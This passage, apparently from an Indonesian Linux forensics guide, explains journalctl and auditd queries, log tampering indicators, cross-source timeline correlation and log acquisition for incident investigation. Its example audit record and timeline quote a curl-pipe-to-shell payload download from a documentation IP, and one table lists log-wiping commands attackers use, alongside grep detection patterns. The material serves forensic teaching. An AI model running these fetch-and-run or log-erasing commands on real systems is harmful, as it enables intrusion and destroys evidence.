
**Pengertian & Fungsi:**
`journalctl` adalah **satu-satunya** cara resmi membaca isi file `.journal` — parsing manual byte-level sangat tidak disarankan kecuali untuk file yang corrupt (§3.4.9). Sub-bab ini kumpulan filter dasar yang sering dipakai.

```bash
# Semua log, urut kronologis (paling lama dulu)
journalctl

# Kebalikan urutan — terbaru dulu (enak buat cek insiden baru terjadi)
journalctl -r

# Filter rentang waktu
journalctl --since "2026-08-14 08:00:00" --until "2026-08-14 10:00:00"
journalctl --since "1 hour ago"
journalctl --since yesterday

# Filter per unit/service systemd
journalctl -u sshd
journalctl -u sshd.service --since today

# Filter per boot — lihat boot sebelum reboot terakhir (kalau persistent)
journalctl --list-boots
journalctl -b -1          # boot sebelumnya
journalctl -b 0           # boot saat ini

# Filter priority minimum (mirip filter severity syslog)
journalctl -p err         # tampilkan err ke atas (err, crit, alert, emerg)
journalctl -p warning..err  # rentang priority tertentu

# Output real-time (mirip tail -f)
journalctl -f

# Kernel messages saja (setara dmesg tapi persistent lintas boot kalau journal persistent)
journalctl -k
```

#### 3.4.5 `journalctl` — Filtering Lanjutan untuk Investigasi

**Pengertian & Fungsi:**
Filter berbasis **field metadata** (bukan cuma text-search) — inilah keunggulan journald dibanding grep biasa di file plaintext, karena tiap entry punya field terstruktur yang bisa di-query presisi.

```bash
# Filter berdasarkan PID spesifik — rekonstruksi seluruh aktivitas satu proses
journalctl _PID=2841

# Filter berdasarkan nama binary/command
journalctl _COMM=sshd
journalctl _COMM=sudo

# Filter berdasarkan UID user yang menjalankan proses penghasil log
journalctl _UID=1000

# Filter berdasarkan executable path lengkap — berguna kalau curiga binary di path aneh
journalctl _EXE=/usr/sbin/sshd
journalctl _EXE=/tmp/.hidden/payload

# Kombinasi multi-field (AND) + text search
journalctl _COMM=sudo _UID=1000 | grep -i "COMMAND="

# Output JSON — untuk diproses lebih lanjut (Python, jq) atau load ke tool timeline
journalctl -o json-pretty -u sshd --since today
journalctl -o json -u sshd | jq -r 'select(.MESSAGE | test("Failed password")) | .__REALTIME_TIMESTAMP'

# Lihat SEMUA field yang tersedia untuk debugging/eksplorasi field apa saja yang ada
journalctl -o verbose -n 5

# Cari cross-boot untuk unit tertentu, output ringkas
journalctl -u cron --no-pager -b all
```

> 💡 **Field `_EXE` vs `_COMM` untuk deteksi anomali:** `_COMM` cuma nama proses (bisa dipalsukan gampang, misal proses malware dinamai `sshd` biar menyamar), sementara `_EXE` adalah **path executable sebenarnya** yang dieksekusi. Kalau `_COMM=sshd` tapi `_EXE=/tmp/.x/sshd` — itu red flag kuat proses menyamar sebagai service legit tapi jalan dari lokasi mencurigakan (relevan untuk Bab 8 — Malware & Rootkit Analysis).

#### 3.4.6 Journal Metadata Field Quick Reference

**Pengertian & Fungsi:**
Tiap entry journal punya lebih banyak field daripada yang terlihat di output default `journalctl` — tabel ini rujukan cepat field yang paling sering dibutuhkan saat investigasi, supaya tidak perlu bolak-balik `journalctl -o verbose` tiap butuh field baru.

| Field | Kategori | Isi | Nilai Forensik |
|---|---|---|---|
| `MESSAGE` | User-supplied | Isi pesan log (teks bebas) | Konten utama, sama seperti baris syslog |
| `PRIORITY` | User-supplied | Level severity (0-7, sama skema §3.2.1) | Filter urgensi |
| `SYSLOG_IDENTIFIER` | User-supplied | Nama program yang dikirim aplikasi sendiri (bisa dipalsukan) | Setara "tag" di syslog RFC 3164 |
| `SYSLOG_FACILITY` | User-supplied | Facility asal (kalau lewat syslog API) | Setara facility §3.2.1 |
| `_PID` | Trusted (kernel-attached) | Process ID pengirim | Tracking proses spesifik |
| `_UID` / `_GID` | Trusted | UID/GID proses pengirim | Atribusi user |
| `_COMM` | Trusted | Nama command/proses (dari `/proc/PID/comm`) | Bisa dipalsukan proses (rename binary) |
| `_EXE` | Trusted | **Path lengkap binary** yang benar-benar dieksekusi | Sulit dipalsukan — lihat §3.4.5, indikator kuat proses menyamar |
| `_CMDLINE` | Trusted | Command line lengkap beserta argumen | Setara `EXECVE` di auditd (§3.5.2) tapi tanpa perlu auditd aktif |
| `_SYSTEMD_UNIT` | Trusted | Unit systemd yang menjalankan proses | Atribusi ke service tertentu |
| `_SYSTEMD_CGROUP` | Trusted | Path cgroup proses | Konteks isolasi proses (container, dst) |
| `_TRANSPORT` | Trusted | Cara entry masuk journal (`syslog`, `journal`, `kernel`, `stdout`, `audit`) | Bedakan sumber asli entry |
| `_HOSTNAME` | Trusted | Hostname saat entry dibuat | Deteksi kalau hostname sistem berubah di tengah investigasi |
| `_MACHINE_ID` | Trusted | Machine ID unik sistem (§3.4.1) | Konfirmasi journal berasal dari mesin yang benar, penting kalau menganalisis banyak `.journal` file dari sumber berbeda |
| `_BOOT_ID` | Trusted | ID unik per sesi boot | Lihat §3.4.7 |
| `__REALTIME_TIMESTAMP` | System | Epoch microsecond, wall-clock UTC | Basis waktu absolut (§3.1.3) |
| `__MONOTONIC_TIMESTAMP` | System | Waktu sejak boot (tidak terpengaruh perubahan clock manual) | Berguna kalau `__REALTIME_TIMESTAMP` dicurigai dimanipulasi via perubahan clock sistem |
| `__CURSOR` | System | Pointer unik posisi entry di journal | Referensi presisi untuk `journalctl --after-cursor=`/`--cursor=` |

```bash
# Tampilkan semua field yang tersedia untuk entry tertentu (eksplorasi awal)
journalctl -o verbose -n 1 -u sshd

# Ambil field spesifik saja dalam format ringkas (script-friendly)
journalctl -u sshd -o json | jq -r '[.["__REALTIME_TIMESTAMP"], ._PID, ._COMM, ._EXE, .MESSAGE] | @tsv'

# Field "trusted" (prefix _ dan __) di-attach KERNEL, tidak bisa dipalsukan aplikasi
# pengirim — beda dari field non-prefix (MESSAGE, SYSLOG_IDENTIFIER) yang sepenuhnya
# dikontrol proses pengirim dan karenanya BISA dipalsukan/dimanipulasi
```

> 💡 **Trusted vs untrusted field — kunci mendeteksi pemalsuan log:** Field ber-prefix `_` dan `__` di-attach langsung oleh kernel/journald berdasarkan proses aktual yang mengirim (tidak bisa dikontrol si pengirim), sementara field tanpa prefix (`MESSAGE`, `SYSLOG_IDENTIFIER`, `PRIORITY`) sepenuhnya bebas diisi aplikasi pengirim. Kalau ada proses yang mencoba menyamar (misal mengirim `SYSLOG_IDENTIFIER=sshd` padahal bukan), field trusted seperti `_EXE`/`_COMM`/`_PID` tetap mencerminkan proses **sebenarnya** — inilah dasar teknis kenapa perbandingan `_COMM` vs `_EXE` di §3.4.5 bisa diandalkan.

#### 3.4.7 Boot ID & Cross-Boot Correlation

**Pengertian & Fungsi:**
Setiap kali sistem boot, kernel men-generate `_BOOT_ID` unik (dibaca dari `/proc/sys/kernel/random/boot_id` saat runtime) — field ini jadi kunci untuk mengelompokkan entry journal per sesi boot dan mengorelasikan aktivitas yang membentang lintas reboot, misalnya untuk membuktikan **persistence yang bertahan setelah restart**.

```bash
# Daftar semua boot session yang tercatat di journal persistent, dengan boot ID & rentang waktu
journalctl --list-boots
# Output kolom: index, boot ID, waktu mulai, waktu selesai

# Query log dari boot spesifik pakai index relatif
journalctl -b 0        # boot saat ini (paling baru)
journalctl -b -1        # satu boot sebelumnya
journalctl -b -2        # dua boot sebelumnya

# Query pakai boot ID eksplisit (lebih presisi, berguna kalau membandingkan lintas mesin/journal file)
journalctl -b <boot-id-hex>
journalctl _BOOT_ID=<boot-id-hex>

# Cek boot ID sistem yang SEDANG berjalan (live, bukan historis)
cat /proc/sys/kernel/random/boot_id

# Cek histori reboot lewat wtmp sebagai cross-check independen (bukan journald)
last reboot
who -b
uptime -s
```

> 📌 **Kegunaan utama korelasi lintas boot:** Kalau suatu payload/persistence mechanism ditemukan aktif di boot terbaru (`-b 0`), cek juga `-b -1`, `-b -2`, dst untuk menentukan **sejak kapan** dia mulai muncul — ini membedakan "baru saja ditanam" vs "sudah lama ada dan bertahan lintas banyak reboot" (indikasi kuat persistence yang efektif, relevan untuk Bab 6). Boot ID juga berguna kalau harus menganalisis beberapa file `.journal` archived (§3.4.1) sekaligus — memastikan entry yang dibandingkan memang berasal dari sesi boot yang sama, bukan tercampur dari boot berbeda yang kebetulan waktu wall-clock-nya berdekatan (misal akibat clock drift, §3.1.3).

> ⚠️ **`__MONOTONIC_TIMESTAMP` hanya valid dalam satu boot ID:** Beda dari `__REALTIME_TIMESTAMP` yang absolut lintas boot, `__MONOTONIC_TIMESTAMP` di-reset tiap boot — kalau membandingkan waktu antar dua boot session berbeda, **wajib** pakai `__REALTIME_TIMESTAMP` atau field `MESSAGE`/timestamp yang sudah dinormalisasi (§3.1.3), jangan pernah bandingkan nilai monotonic lintas `_BOOT_ID` berbeda.

#### 3.4.8 Forward Secure Sealing (FSS) — Anti-Tamper Journal

**Pengertian & Fungsi:**
FSS adalah fitur opsional journald yang menyediakan bukti kriptografis kalau isi journal **tidak diubah** setelah ditulis — relevan kalau target investigasi punya ini aktif (jarang default, biasanya diaktifkan sengaja di environment yang memang concern soal integritas log).

```bash
# Cek apakah FSS aktif
journalctl --verify

# Setup FSS (biasanya dilakukan admin proaktif, bukan langkah investigasi — 
# tapi penting dikenali kalau ketemu output ini saat cek konfigurasi)
journalctl --setup-keys
```

> 📌 Kalau FSS **tidak** aktif (kondisi paling umum ditemui), tidak ada jaminan kriptografis native — integritas journal harus dinilai secara tidak langsung: konsistensi sequence number, gap waktu tidak wajar, atau cross-check dengan sumber lain (rsyslog forward, auditd, mtime file journal itu sendiri di level Ext4/XFS — Bab 2 §2.1.2).

#### 3.4.9 Journal Rusak/Corrupt & Cara Recovery

**Pengertian & Fungsi:**
File `.journal` bisa corrupt akibat shutdown tidak normal, disk error, atau — dalam konteks investigasi — **sengaja dirusak attacker** untuk menghambat analisis tanpa menghapusnya total (lebih menyamar dibanding hapus file, karena file masih "ada" tapi tidak terbaca).

```bash
# Verifikasi integritas — akan melaporkan di offset mana kerusakan terjadi
journalctl --verify

# Coba baca file yang berpotensi corrupt secara eksplisit
journalctl --file=/path/to/system.journal

# Kalau journalctl gagal total, journald sendiri biasanya otomatis me-rotate file
# corrupt jadi *.journal~ saat startup berikutnya dan mulai file baru — cek file ini juga
ls -la /var/log/journal/<machine-id>/*.journal~
journalctl --file=/var/log/journal/<machine-id>/system.journal~
```

> ⚠️ File dengan akhiran `~` (tilde) adalah journal yang ditandai corrupt oleh systemd sendiri — jangan diabaikan, tetap bisa dibaca sebagian dan sering menyimpan justru **momen tepat sebelum corruption terjadi**, yang kalau corruption-nya disengaja, adalah momen paling relevan untuk investigasi.

---

### 3.5 auditd — Pelengkap Kernel-Level untuk Syslog/Journald

> 🔧 **Catatan posisi bagian ini:** `auditd` di sini **bukan** sumber log ketiga yang berdiri sejajar dan independen dari §3.2–§3.4 — dia adalah **lapisan pelengkap opsional**. Semua workflow investigasi di bab ini (§3.3, §3.8, §3.10, §3.13) tetap berjalan penuh hanya dengan syslog klasik + journald; `auditd` dipakai **kalau kebetulan aktif dan rule-nya relevan**, memberi presisi tambahan (command line lengkap, syscall-level detail) yang syslog/journald sendiri tidak selalu punya. Jangan pernah menyimpulkan "tidak ada evidence" hanya karena `auditd` tidak aktif — cek dulu §3.2–§3.4 sebagai baseline wajib.

#### 3.5.1 Posisi auditd — Complementary, Bukan Sumber Berdiri Sendiri

**Pengertian & Fungsi:**
`auditd` beroperasi di level **kernel audit subsystem**, jauh lebih dalam dari syslog/journald yang sifatnya application-level logging. Kalau aktif dan dikonfigurasi dengan rule yang tepat, ini sumber evidence paling presisi untuk **syscall-level activity** (eksekusi command, akses file, perubahan permission) — tapi butuh setup eksplisit, tidak semua sistem punya ini aktif dengan rule yang berguna. Karena sifatnya opsional dan bergantung rule, `auditd` paling tepat diperlakukan sebagai **penguat/cross-check** terhadap temuan dari §3.3 (auth log) dan §3.4 (journald), bukan titik awal investigasi.

```bash
# Cek status service — LANGKAH PERTAMA, jangan asumsikan aktif
systemctl status auditd

# Kalau tidak aktif, cukup catat di laporan sebagai "sumber tidak tersedia"
# dan lanjut dengan §3.2-§3.4 sebagai sumber utama — TIDAK menghentikan investigasi

# Kalau aktif, cek rule audit yang sedang berlaku
sudo auditctl -l
```

| Skenario | Peran auditd |
|---|---|
| auditd aktif + rule `EXECVE` ada (§3.5.4) | Pelengkap kuat — verifikasi command line persis untuk temuan sudo/journald di §3.3.2/§3.4.5 |
| auditd aktif tapi rule minim/default | Pelengkap terbatas — mungkin hanya menangkap `USER_LOGIN`/`USER_CMD`, tetap berguna cross-check §3.3 |
| auditd tidak aktif/tidak terinstal | Bukan blocker — lanjutkan investigasi penuh dengan §3.2–§3.4; catat keterbatasan ini di §3.9 (evidence gap) |

> 📌 **Kenapa ini bukan pengganti journald/syslog:** `auditd` fokus pada *policy compliance & security-relevant kernel events* (siapa mengakses apa, syscall apa dijalankan) berdasarkan **rule eksplisit** yang harus didefinisikan admin — beda dari journald yang menangkap *semua* output aplikasi secara pasif. Kalau tidak ada rule yang match suatu aktivitas, `auditd` tidak akan mencatatnya sama sekali walau service-nya jalan — itulah kenapa dia melengkapi, bukan menggantikan, dua sumber utama di §3.2 dan §3.4.

#### 3.5.2 Format `audit.log` & Tipe Event Kunci

**Pengertian & Fungsi:**
Format `audit.log` terstruktur dengan `type=` sebagai kategori event — konsep paling mendekati "Event ID" ala Windows dibanding sumber log Linux lainnya.

| `type=` | Arti | Nilai Forensik |
|---|---|---|
| `SYSCALL` | Syscall dipanggil (kalau ada rule `-a always,exit -S <syscall>`) | Evidence paling granular — argumen, UID, exit code |
| `EXECVE` | Command dieksekusi (pasangan dengan `SYSCALL execve`) | **Command line lengkap** proses yang dijalankan — sangat berharga |
| `USER_LOGIN` / `USER_AUTH` | Event login/autentikasi | Paralel dengan `auth.log` tapi lebih terstruktur |
| `USER_CMD` | Command via sudo tercatat oleh PAM audit module | Paralel §3.3.2 tapi format terstruktur |
| `PATH` | Path file yang terlibat suatu syscall | Konfirmasi file spesifik yang diakses/dimodifikasi |
| `CWD` | Current working directory saat syscall dipanggil | Konteks lokasi eksekusi |
| `CONFIG_CHANGE` | Perubahan rule audit itu sendiri | **Kritis** — indikasi attacker mematikan/mengubah audit rule |

```
Contoh potongan event EXECVE (disederhanakan):
type=SYSCALL msg=audit(1755142523.482:1021): arch=c000003e syscall=59 success=yes exit=0
  a0=... a1=... items=2 ppid=2841 pid=2905 auid=1000 uid=0 gid=0 euid=0 comm="bash"
  exe="/bin/bash" key="exec_tracking"
type=EXECVE msg=audit(1755142523.482:1021): argc=3 a0="bash" a1="-c" a2="curl http://203.0.113.5/x.sh|sh"
```

> 💡 **`EXECVE` sebagai pengganti bash history yang bisa dihapus:** Kalau `.bash_history` attacker dihapus/dimanipulasi (dibahas Bab 4 §4.x), event `EXECVE` di `audit.log` — kalau rule-nya aktif merekam `execve` syscall — **tetap merekam command line lengkap** independen dari shell history. Ini salah satu alasan kenapa `auditd` sangat bernilai kalau memang aktif di sistem target.

#### 3.5.3 `ausearch` & `aureport`

**Pengertian & Fungsi:**
Dua tool bawaan `audit` package untuk query dan summary — lebih nyaman dibanding grep manual karena format `audit.log` cukup padat/sulit dibaca mentah.

```bash
# Cari semua event terkait UID tertentu
sudo ausearch -ua 1000

# Cari berdasarkan rentang waktu
sudo ausearch -ts today -te now

# Cari berdasarkan tipe event
sudo ausearch -m EXECVE
sudo ausearch -m USER_LOGIN

# Cari berdasarkan key yang didefinisikan di audit rule (§3.5.4)
sudo ausearch -k exec_tracking

# Rangkuman statistik cepat (login, command, file access)
sudo aureport --summary
sudo aureport -x --summary     # summary khusus executable
sudo aureport -au              # summary authentication events
```

#### 3.5.4 Audit Rules yang Relevan Forensik

**Pengertian & Fungsi:**
Contoh rule (`/etc/audit/rules.d/audit.rules`) yang kalau ditemukan aktif di sistem target, menandakan kemungkinan besar `EXECVE`/`SYSCALL` tracking tersedia untuk investigasi.

```bash
# Rule umum untuk tracking eksekusi command (menghasilkan event EXECVE)
-a always,exit -F arch=b64 -S execve -k exec_tracking

# Rule tracking modifikasi file sensitif
-w /etc/passwd -p wa -k identity_changes
-w /etc/shadow -p wa -k identity_changes
-w /etc/sudoers -p wa -k identity_changes

# Rule tracking loading kernel module — relevan deteksi rootkit LKM (Bab 8)
-a always,exit -F arch=b64 -S init_module,finit_module -k module_loading
```

```bash
# Cek isi file rule aktual di sistem target
cat /etc/audit/rules.d/audit.rules
cat /etc/audit/audit.rules   # kadang jadi satu file gabungan hasil compile
```

---

### 3.6 Log Aplikasi & Layanan Lain

#### 3.6.1 Cron & Task Scheduler

**Pengertian & Fungsi:**
Log eksekusi cron — komplemen langsung untuk verifikasi konten crontab (dibahas detail sebagai bagian **persistence** di Bab 6), di sini fokusnya *kapan* dan *apa* yang benar-benar tereksekusi.

```bash
grep CRON /var/log/syslog
# atau
cat /var/log/cron

# Pola pesan tipikal
# CRON[<pid>]: (<user>) CMD (<command>)
```

> 🔗 Isi file crontab, `/etc/cron.d/`, dan struktur persistence via cron dibahas mendalam di **Bab 6 — Persistence: cron, systemd, init scripts, LD_PRELOAD**; di sini fokusnya bukti *eksekusi* lewat log, bukan definisi jadwalnya.

#### 3.6.2 Mail Log

**Pengertian & Fungsi:**
Relevan kalau skenario melibatkan exfiltration via email atau server yang jadi relay spam pasca-compromise.

```bash
grep -i "from=\|to=" /var/log/mail.log
```

#### 3.6.3 Package Manager Log

**Pengertian & Fungsi:**
Riwayat instalasi/upgrade software — berguna korelasi waktu attacker menginstal tool tambahan (netcat, tunneling tool, dst) pasca-akses awal.

```bash
# Debian/Ubuntu
cat /var/log/dpkg.log | grep " install "
cat /var/log/apt/history.log

# RHEL/CentOS
cat /var/log/yum.log        # sistem lama
sudo rpm -qa --last          # query rpm database langsung, urut waktu install
```

#### 3.6.4 Web Server Log (Nginx/Apache)

**Pengertian & Fungsi:**
Kalau target adalah server web yang jadi initial access vector, access & error log web server sering jadi **bukti pertama** exploit dijalankan (request mencurigakan, webshell upload, dst) — sebelum jejaknya masuk ke auth.log/journald.

```bash
# Lokasi umum
ls /var/log/nginx/
ls /var/log/apache2/    # Debian/Ubuntu
ls /var/log/httpd/      # RHEL/CentOS

# Cari pola request mencurigakan (contoh: webshell, path traversal)
grep -E "\.php\?|\.\./|union.*select|<script" /var/log/nginx/access.log

# Korelasikan timestamp request dengan munculnya file baru di webroot (Bab 2 crtime)
grep "POST" /var/log/nginx/access.log | awk '{print $4,$5,$7}'
```

> 📌 Detail parsing format access log (Common Log Format/Combined Log Format) dan teknik deteksi webshell tidak dibahas lebih dalam di sini karena di luar cakupan seri OS-forensics murni — disebut karena sering jadi **sumber timestamp awal** yang perlu dikorelasikan dengan `auth.log`/journald untuk membangun rantai infeksi lengkap (lihat §3.8).

---

### 3.7 Log Tampering & Anti-Forensics

#### 3.7.1 Teknik Penghapusan/Manipulasi Log oleh Attacker

**Pengertian & Fungsi:**
Daftar teknik umum yang perlu dikenali polanya — masing-masing meninggalkan jejak tidak langsung yang berbeda meski log utamanya sudah hilang.

| Teknik | Cara Kerja | Jejak Tidak Langsung yang Tersisa |
|---|---|---|
| Hapus baris spesifik dari log plaintext | Edit langsung file dengan `sed`/script, hapus baris yang mengandung jejak mereka | Gap waktu tidak wajar di sequence log sekitarnya; mtime file berubah tapi ukuran tidak proporsional dengan aktivitas normal |
| Hapus seluruh file log | `rm /var/log/auth.log` | File hilang total dari direktori, tapi **inode bisa masih recoverable** kalau belum di-reuse (Bab 2 §2.3, §2.5.9) |
| `> /var/log/auth.log` (truncate) | Kosongkan isi tanpa hapus file/inode | Inode number **sama persis** sebelum-sesudah, tapi ukuran jadi 0 — pola sangat khas, mudah dicurigai |
| `journalctl --vacuum-time=1s` / `--vacuum-size=` | Paksa journald buang entry lama | File `.journal` lama hilang, tapi kalau ada forward ke rsyslog, plaintext log masih bisa menyimpan datanya (§3.1.2) |
| Stop service logging sementara | `systemctl stop rsyslog` sebelum beraksi, start lagi setelahnya | Gap total tanpa entry apapun di rentang waktu tersebut — cross-check journald (`_SYSTEMD_UNIT=rsyslog.service`) untuk waktu stop/start service-nya sendiri |
| Timestomp file log | Ubah mtime file log manual (`touch`) supaya terlihat "tidak pernah diubah" | crtime inode (Bab 2 §2.1.3) tetap tidak berubah, cross-check dengan mtime — inkonsistensi jadi indikator |
| Symlink `/var/log` ke `/dev/null` atau lokasi lain | Redirect logging sebelum aktivitas dimulai | Perubahan pada struktur direktori `/var/log` itu sendiri (butuh baseline distro normal untuk banding) |

#### 3.7.2 Indikator Log Tampering

**Pengertian & Fungsi:**
Checklist cepat sinyal yang perlu dicari saat mencurigai log sudah dimanipulasi.

```bash
# 1. Cek gap sequence number journald — journald menomori entry secara berurutan
#    per boot; gap besar tanpa alasan (bukan restart service) mencurigakan
journalctl --list-boots
journalctl -o verbose | grep -i "__SEQNUM"

# 2. Bandingkan ukuran file log dengan histori rotasi normal — file yang tiba-tiba
#    jauh lebih kecil dari rotasi sebelumnya di periode sama patut dicurigai
ls -la /var/log/auth.log*

# 3. Cek mtime file log vs waktu aktivitas sistem lain di sekitarnya (Bab 2 §2.1.2)
stat /var/log/auth.log

# 4. Cari event CONFIG_CHANGE di audit.log — indikasi rule audit diubah/dimatikan
sudo ausearch -m CONFIG_CHANGE

# 5. Cek history shell admin untuk command penghapusan log (kalau history-nya sendiri
#    tidak ikut dihapus — lihat Bab 4 soal integritas .bash_history)
grep -E "logrotate|vacuum|> */var/log|rm.*log" /home/*/.bash_history /root/.bash_history 2>/dev/null

# 6. Cek apakah service logging pernah restart tidak wajar
journalctl -u rsyslog -u systemd-journald --since "7 days ago"
```

#### 3.7.3 Mitigasi & Hardening (Konteks Investigasi)

**Pengertian & Fungsi:**
Bukan langkah investigasi langsung, tapi penting dipahami sebagai konteks — kalau sistem target sudah menerapkan ini, sebagian teknik anti-forensics di §3.7.1 jadi lebih sulit dilakukan attacker, dan itu sendiri informasi berguna soal postur keamanan target.

| Kontrol | Efek terhadap Anti-Forensics |
|---|---|
| Remote syslog forwarding (kirim log real-time ke server terpisah) | Attacker menghapus log lokal tidak berpengaruh ke salinan di server log terpusat |
| `chattr +a` pada file log (append-only, Bab 2 §2.1.5) | Mencegah truncate/edit tanpa hapus flag dulu (butuh root, tapi tetap ada jejak `chattr` di history/audit) |
| FSS journald aktif (§3.4.6) | Memberi bukti kriptografis kalau journal diubah |
| Audit rule `-e 2` (immutable config) | Rule audit tidak bisa diubah tanpa reboot — mencegah `CONFIG_CHANGE` on-the-fly |

---

### 3.8 Timeline Correlation Lintas Sumber Log

**Pengertian & Fungsi:**
Investigasi jarang selesai dengan satu sumber log saja — kekuatan sebenarnya ada di mengorelasikan timestamp yang sama dari berbagai sumber untuk membangun rantai kejadian yang saling menguatkan, sekaligus menutup celah kalau satu sumber sudah dimanipulasi/hilang.

```
Contoh alur korelasi (skenario: SSH brute force → login sukses → privilege escalation → eksekusi payload):

09:12:01–09:14:55   auth.log: puluhan "Failed password" dari IP 203.0.113.5     (§3.3.1)
09:14:58             auth.log: "Accepted password for eatersun from 203.0.113.5" (§3.3.1)
09:15:02             journald: sesi PAM baru terbuka untuk UID 1000              (§3.4.4, journalctl _UID=1000)
09:15:44             auth.log + journald: sudo COMMAND=/bin/bash                 (§3.3.2)
09:15:47             audit.log: type=EXECVE argc=3 a0="bash" a1="-c" a2="curl ... | sh"  (§3.5.2)
09:15:48             Ext4 inode crtime: file baru muncul di /tmp (Bab 2 §2.1.2)
09:16:10             journald _COMM= proses baru dengan _EXE= path mencurigakan  (§3.4.5)
```

> 💡 **Prinsip korelasi:** Kalau `auth.log` menunjukkan login jam 09:14:58 tapi `audit.log`/journald sama sekali tidak punya entry apapun di rentang waktu berdekatan — itu sendiri sinyal salah satu sumber sudah dimanipulasi atau service-nya memang tidak aktif merekam di periode tersebut, bukan berarti "tidak ada aktivitas". Selalu bangun timeline dari **minimal dua sumber independen** sebelum menyimpulkan urutan kejadian di laporan akhir.

---

### 3.9 Log Reliability & Evidence Gap Table

**Pengertian & Fungsi:**
Tidak semua sumber log sama kuatnya sebagai evidence — tabel ini merangkum seberapa gampang tiap sumber dimanipulasi, berapa lama datanya bertahan, dan celah/blind spot yang perlu diwaspadai. Dipakai di awal investigasi untuk **menetapkan ekspektasi realistis** soal apa yang bisa dan tidak bisa dibuktikan dari sistem target, dan dirujuk balik saat menulis laporan akhir (§3.13) untuk secara eksplisit menyatakan keterbatasan evidence (bukan cuma menyimpulkan tanpa catatan).

| Sumber | Ketahanan Terhadap Tampering | Retention Khas | Blind Spot / Celah | Rekomendasi Cross-Check |
|---|---|---|---|---|
| Syslog klasik plaintext (`/var/log/*.log`) | Rendah — file teks biasa, gampang di-edit/truncate dengan akses root | Bergantung `logrotate` (§3.2.5), umum 7-30 hari | Tidak menyimpan field terstruktur; timestamp RFC 3164 tanpa tahun (§3.2.2) | Journald (§3.4) untuk metadata proses, rotasi lama (`.gz`) untuk histori lebih panjang |
| journald (`.journal` binary) | Sedang — butuh tool khusus untuk edit, tapi tetap bisa di-`--vacuum` atau file dihapus root | `SystemMaxUse`/`MaxRetentionSec` di config, default sering longgar tapi tidak dijamin | Volatile kalau `Storage=volatile`/tidak ada `/var/log/journal` (§3.4.2) — hilang total saat reboot | Syslog forward (kalau ada), remote journal upload (§3.2.6) |
| `audit.log` (auditd) | Sedang-Tinggi — perubahan rule tercatat sebagai `CONFIG_CHANGE` sendiri (§3.5.2), append-only secara default | Rotasi internal auditd sendiri (`max_log_file`), sering lebih pendek dari syslog kalau tidak dikonfigurasi ulang | **Hanya mencatat apa yang di-rule-kan eksplisit** (§3.5.1) — tidak aktif sama sekali di banyak sistem default | Journald `_EXE`/`_CMDLINE` (§3.4.6) sebagai pengganti kalau auditd tidak tersedia |
| Log terpusat/remote (§3.2.6) | **Tinggi** — di luar jangkauan attacker yang cuma kuasai mesin lokal | Kebijakan retention server terpusat, biasanya lebih panjang & lebih terjamin | Butuh forwarding aktif dari awal — tidak bisa "diaktifkan surut" untuk insiden yang sudah lewat | Jadikan sumber otoritatif kalau tersedia (§3.2.6) |
| Ext4/XFS inode timestamp (Bab 2 §2.1.2) | Rendah-Sedang — `mtime`/`atime` gampang di-timestomp, `crtime` lebih sulit dimanipulasi tanpa tool khusus | Selama file/inode belum di-reuse (Bab 2 §2.3) | Tidak menyimpan konteks "siapa melakukan apa", cuma "kapan file berubah" | Kombinasikan dengan log aplikasi terkait untuk konteks aksi |
| Firewall/network log (kalau aktif) | Sedang | Bergantung retention masing-masing tool | Sering tidak default aktif; volume besar → retention pendek | `auth.log` untuk korelasi koneksi masuk yang berhasil autentikasi |

> ⚠️ **Prinsip pelaporan:** Kalau suatu klaim di laporan cuma didukung sumber dengan ketahanan **rendah** (misal syslog plaintext saja, tanpa journald/remote log yang konsisten), nyatakan eksplisit tingkat keyakinannya lebih rendah dibanding klaim yang didukung sumber **tinggi** (log terpusat) atau minimal dua sumber independen (§3.8). Evidence gap yang tidak bisa ditutup (misal journal volatile yang sudah hilang karena reboot, tidak ada forwarding) harus dicatat sebagai keterbatasan investigasi, bukan diabaikan atau diasumsikan "tidak ada aktivitas".

---

### 3.10 Tabel Korelasi — Pertanyaan Investigasi ke Sumber Log

| Pertanyaan | Sumber Utama | Sumber Pelengkap | Bagian |
|---|---|---|---|
| Siapa login, kapan, dari IP mana | `auth.log`/`secure` | journald (`_COMM=sshd`) | §3.3.1, §3.4.5 |
| Command apa yang dijalankan dengan privilege root | `sudo` di `auth.log` | `audit.log` type=`USER_CMD`/`EXECVE` | §3.3.2, §3.5.2 |
| Command lengkap suatu proses (kalau bash history dihapus) | `audit.log` type=`EXECVE` | journald `_EXE=`/`_COMM=` | §3.5.2, §3.4.5 |
| User/grup baru dibuat (indikasi backdoor account) | `auth.log` (useradd/usermod) | `audit.log` type=`CONFIG_CHANGE`/watch `/etc/passwd` | §3.3.3, §3.5.4 |
| Log sengaja dihapus/dikosongkan | mtime & ukuran file (§2.1.2) | journald sequence gap, `CONFIG_CHANGE` | §3.7.1, §3.7.2 |
| Proses menyamar sebagai service legit | journald `_COMM` vs `_EXE` mismatch | `audit.log` PATH/EXECVE | §3.4.5, §3.5.2 |
| Riwayat instalasi tool attacker | `dpkg.log`/`yum.log` | mtime binary terkait (Bab 2) | §3.6.3 |
| Initial access lewat aplikasi web | Access/error log web server | `auth.log` (kalau lanjut jadi SSH/shell) | §3.6.4, §3.8 |
| Jadwal persistence via cron benar-benar jalan | `CRON` entry di `syslog`/`cron` | Isi crontab (Bab 6) | §3.6.1 |
| Loading kernel module mencurigakan | `audit.log` type=`SYSCALL` (init_module) | `dmesg`/`journalctl -k`, `/sys/module` (Bab 1 §1.2.7) | §3.5.4 |
| Rentang waktu evidence log tersedia | Retention `logrotate` (§3.2.5) | `journalctl --list-boots`, `Storage=` journald.conf | §3.2.5, §3.4.2 |

> 💡 **Cara pakai tabel ini:** Sama prinsipnya dengan tabel korelasi Bab 2 §2.11 — mulai dari kolom pertanyaan sesuai soal/kasus, lompat ke bagian relevan, kombinasikan sumber utama & pelengkap alih-alih berhenti di satu sumber.

---

### 3.11 Log Preservation / Acquisition

**Pengertian & Fungsi:**
Sebelum analisis mendalam, log yang masih ada di sistem live **harus diakuisisi dengan benar** — prinsipnya sama dengan akuisisi disk image di Lampiran Bab 1, tapi log punya kekhususan sendiri: sebagian berupa file plaintext yang bisa langsung di-copy, sebagian binary (`.journal`) yang butuh cara ekspor khusus supaya tetap utuh dan bisa diverifikasi.

```bash
# ===== 1. Hash file log SEBELUM disentuh — baseline integritas =====
sha256sum /var/log/auth.log /var/log/syslog > /tmp/log_hashes_before.txt

# ===== 2. Copy log plaintext & rotasinya secara utuh (preserve metadata) =====
mkdir -p /mnt/evidence/logs
sudo cp -a /var/log/auth.log* /var/log/syslog* /mnt/evidence/logs/
sudo cp -a /var/log/audit/audit.log* /mnt/evidence/logs/ 2>/dev/null

